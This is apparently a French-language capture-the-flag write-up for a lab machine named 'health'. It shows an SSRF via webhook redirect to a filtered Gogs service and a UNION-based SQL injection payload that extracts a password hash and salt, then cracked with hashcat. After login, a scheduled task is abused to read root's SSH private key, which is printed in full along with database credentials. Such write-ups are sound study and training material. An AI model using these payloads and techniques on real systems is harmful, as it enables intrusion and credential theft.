\chapter{health}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: laravel, gogs
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.176
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HTTP Monitoring Tool
|_http-server-header: Apache/2.4.29 (Ubuntu)
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsubsection{http}

\begin{verbatim}
About:

This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.
For Developers:

Once the webhook has been created, the webhook recipient is periodically informed about the status of the monitored application by means of a post request containing various details about the http service.
Its simple:

No authentication is required. Once you create a monitoring job, a UUID is generated which you can share with others to manage the job easily.
\end{verbatim}

ca tombe bien le port 3000 est filtré.

Le serveur ne veut pas monitorer 127.0.0.1 ni \verb+http://health.htb:3000/+


par contre on peut monitorer notre serveur http et s'en servir comme de
webhook. Par contre le \verb+pythonb -m http.sever+ ne marche pas sur le
\verb+POST+
\begin{verbatim}
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.176 - - [15/Nov/2022 14:55:44] "GET / HTTP/1.0" 200 -
10.10.11.176 - - [15/Nov/2022 14:55:44] code 501, message Unsupported method ('POST')
10.10.11.176 - - [15/Nov/2022 14:55:44] "POST / HTTP/1.1" 501 -
\end{verbatim}

donc il faut faire un \verb+http.server+ qui accepte le POST

\begin{verbatim}
#!/usr/bin/env python3
"""
Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
\end{verbatim}

\begin{verbatim}
10.10.11.176 - - [15/Nov/2022 15:43:57] "GET / HTTP/1.0" 200 -
INFO:root:POST request,
Path: /
Headers:
Host: 10.10.16.3
Accept: */*
Content-type: application/json
Content-Length: 267



Body:
{"webhookUrl":"http:\/\/10.10.16.3\/","monitoredUrl":"http:\/\/10.10.16.3\/","health":"up","body":"GET request for \/","message":"HTTP\/1.0 200 OK","headers":{"Server":"BaseHTTP\/0.6 Python\/3.10.8","Date":"Tue, 15 Nov 2022 14:43:57 GMT","Content-type":"text\/html"}}

10.10.11.176 - - [15/Nov/2022 15:43:57] "POST / HTTP/1.1" 200 -
INFO:root:GET request,
Path: /
Headers:
Host: 10.10.16.3
Connection: close
\end{verbatim}


On ne peut pas faire un proxy car le 3000 est filtré donc il faut essayer de
faire une redirection.
il suffit de remplacer la fonction \verb+_set_response(self)+
\begin{verbatim}
    def _set_response(self):
        self.send_response(301)
        self.send_header('Location','http://10.10.11.176:3000')
        self.end_headers()
\end{verbatim}

ca fonctionne par contre on recoit donc un html inclus dans un json
(\verb+body+) qu'il va
falloir rendre clean.

\begin{verbatim}
import json

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        json_object = json.loads(post_data.decode('utf-8'))
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), json_object["body"])

\end{verbatim}

On obtient une page de login sur
\begin{verbatim}
© 2014 GoGits · Version: 0.5.5.1010 Beta · Page: 1ms · Template: 1ms
\end{verbatim}

Multiple SQL injection vulnerabilities in Gogs (aka Go Git Service) 0.3.1-9 up
to and including 0.5.x prior to 0.5.6.1105 Beta allow remote malicious users to
execute arbitrary SQL commands via the q parameter to (1) api/v1/repos/search,
which is not properly handled in models/repo.go, or (2) api/v1/users/search,
which is not properly handled in models/user.go.

\url{https://www.exploit-db.com/exploits/35238}

ne marche pas sur la partie enumeration des users.

donc on regard le code:
\verb+SearchUsers+:
\begin{verbatim}
    opt := models.SearchOption{
		Keyword: ctx.Query("q"),
		Limit:   com.StrTo(ctx.Query("limit")).MustInt(),
	}
    ...SNIP...
    us, err := models.SearchUserByName(opt)

    for i := range us {
		results[i] = &user{
			UserName:   us[i].Name,
			AvatarLink: us[i].AvatarLink(),
		}
	}
\end{verbatim}
donc retourne 2 champs le username pris sur \verb+user.Name+ et
\verb+uer.AvatarLink()+

\begin{verbatim}
func SearchUserByName(opt SearchOption) (us []*User, err error) {
    opt.Keyword = strings.TrimSpace(opt.Keyword)
    err = x.Limit(opt.Limit).Where("type=0").
        And("lower_name like '%" + opt.Keyword + "%'").Find(&us)
\end{verbatim}

on va donc avoir une requête \verb+where lower_name like '%_%'+

deja on peut enum les users an redirigeant tout simplement vers
\verb+api/va/users/search?q=+

normalement le \verb+_+ represente n'importe quel caractère

avec \verb+api/va/users/search?q=_+ on voit qu'il n'y a qu'un user:
\verb+susanne+

maintenant il va falloir obtenir son password. En regardant la structure d'un
user on voit qu'il y a un \verb+salt+. Il y a la fonction d'encodage d'un
password:
\begin{verbatim}
func (u *User) EncodePasswd() {
	newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
	u.Passwd = fmt.Sprintf("%x", newPasswd)
}

// ValidtePassword checks if given password matches the one belongs to the user.
func (u *User) ValidtePassword(passwd string) bool {
	newUser := &User{Passwd: passwd, Salt: u.Salt}
	newUser.EncodePasswd()
	return u.Passwd == newUser.Passwd
}
\end{verbatim}


donc il nous faut le salt et le password.


donc le bypass de l'espace \verb+/**/+ devrait passer

attention en fait on a un \verb+.And(+ donc c'est pour cela qu'il ferme la
\verb+)+ 
on va deja essayer de retourner un faux utilisateur. Il faut donc que l'on
passe une requete comme cela:
\begin{verbatim}
"lower_name like '%e')/**/UNION/**/ALL/**/SELECT/**/list_of_fields/--/**/- %'"
\end{verbatim}
dans \verb+list_of_fields+ on met:
\begin{verbatim}
null,null,'toto',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
\end{verbatim}

ca ne passe pas dans le payload de l'exploit à la fin il y a \verb+('%'='+ en
url encode.
\begin{verbatim}
"lower_name like '%e')/**/UNION/**/ALL/**/SELECT/**/list_of_fields/--/**/-'%25'%3D'%'"
\end{verbatim}
et la ca passe

donc si à la place de \verb+'toto'+ on met
\verb+(select/**/passwd/**/from/**/user)+

on ontient :
\verb+66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37+

pour \verb+salt+: \verb+sO3XIbeW14+


hashcat indique une structure comme cela pour l'algo d'encodage
\begin{verbatim}
10900 	PBKDF2-HMAC-SHA256 	sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
\end{verbatim}

mais ca ne correspond pas. Autant le salt semble bon autant le password ne
correspond pas on semble avoir une representaiton en hexa.

\begin{verbatim}
$ echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -ps |base64
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
\end{verbatim}


\begin{verbatim}
$ hashcat -m 10900 hash /usr/share/wordlists/passwords/rockyou.txt
sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:
february15
\end{verbatim}

he ben grosse galere

\subsection{Foothold}
\subsubsection{susanne}
\begin{verbatim}
susanne / february15
$ ssh susanne@health.htb
susanne@health:~$
susanne@health:~$ ./linpeas.sh -q -P february15 | tee linpeas.out
.. .SNIP. ..
PermitRootLogin yes
.. .SNIP. ..
-rw-r--r-- 1 www-data www-data 978 May 17 17:17 /var/www/html/.env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:x12LE6h+TU6x4gNKZIyBOmthalsPLPLv/Bf/MJfGbzY=
APP_DEBUG=true
APP_URL=http://localhost
LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+



\end{verbatim}
rien de bien folichon :

root peut ssh

par contr \verb+pspy+:
\begin{verbatim}
2022/11/16 00:02:01 CMD: UID=0    PID=31055  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1
2022/11/16 00:02:01 CMD: UID=0    PID=31054  | /bin/bash -c sleep 5 && /root/meta/clean.sh
2022/11/16 00:02:01 CMD: UID=0    PID=31053  | /usr/sbin/CRON -f
2022/11/16 00:02:01 CMD: UID=0    PID=31052  | /usr/sbin/CRON -f
2022/11/16 00:02:01 CMD: UID=0    PID=31057  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1
2022/11/16 00:02:02 CMD: UID=0    PID=31060  | grep columns
2022/11/16 00:02:02 CMD: UID=0    PID=31059  |
2022/11/16 00:02:02 CMD: UID=0    PID=31058  | sh -c stty -a | grep columns
2022/11/16 00:02:02 CMD: UID=0    PID=31063  | grep columns
2022/11/16 00:02:02 CMD: UID=0    PID=31061  | sh -c stty -a | grep columns
\end{verbatim}


Artisan is the command line interface included with Laravel. Artisan exists at
the root of your application as the artisan script and provides a number of
helpful commands that can assist you while you build your application. To view
a list of all available Artisan commands, you may use the list command:

Laravel's command scheduler offers a fresh approach to managing scheduled tasks
on your server. The scheduler allows you to fluently and expressively define
your command schedule within your Laravel application itself. When using the
scheduler, only a single cron entry is needed on your server. Your task
schedule is defined in the app/Console/Kernel.php file's schedule method. To
help you get started, a simple example is defined within the method.

donc c'est avec ca qu'il lance le health check

\begin{verbatim}
$ php artisan schedule:list
+---------+----------+-------------+----------+
| Command | Interval | Description | Next Due |
+---------+----------+-------------+----------+

\end{verbatim}

\begin{verbatim}
$ mysql -u laravel -D laravel -p
mysql> select table_name from information_schema.tables;
mysql> select * from tasks;
+--------------------------------------+--------------------+-----------+-------------------------+-----------+---------------------+---------------------+
| id                                   | webhookUrl         | onlyError | monitoredUrl            | frequency | created_at          | updated_at          |
+--------------------------------------+--------------------+-----------+-------------------------+-----------+---------------------+---------------------+
| 10b7db4d-2344-40c8-978f-db0e6f285b16 | http://10.10.16.3/ |         0 | http://10.10.16.3:8181/ | * * * * * | 2022-11-16 00:27:59 | 2022-11-16 00:27:59 |
+--------------------------------------+--------------------+-----------+-------------------------+-----------+---------------------+---------------------+

\end{verbatim}

en fait il y a une tâche qui après l'exec purge la table

\begin{verbatim}
2022/11/16 00:36:02 CMD: UID=0    PID=31733  | php artisan schedule:run
2022/11/16 00:36:02 CMD: UID=0    PID=31737  | grep columns
2022/11/16 00:36:02 CMD: UID=0    PID=31736  | stty -a
2022/11/16 00:36:02 CMD: UID=0    PID=31735  | sh -c stty -a | grep columns
2022/11/16 00:36:02 CMD: UID=0    PID=31738  |
2022/11/16 00:36:07 CMD: UID=0    PID=31741  | mysql laravel --execute TRUNCATE tasks
\end{verbatim}

\begin{verbatim}
insert into tasks
    -> values ('10b7db4d-2344-40c8-978f-db0e6f285b16', 'http://10.10.16.3/', 0, 'file:///root/.ssh/id_rsa', '* * * * *',null,null);

Body:
{"webhookUrl":"http:\/\/10.10.16.3\/","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}

\end{verbatim}

\begin{verbatim}

\end{verbatim}


\subsubsection{x}




\begin{verbatim}

\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}


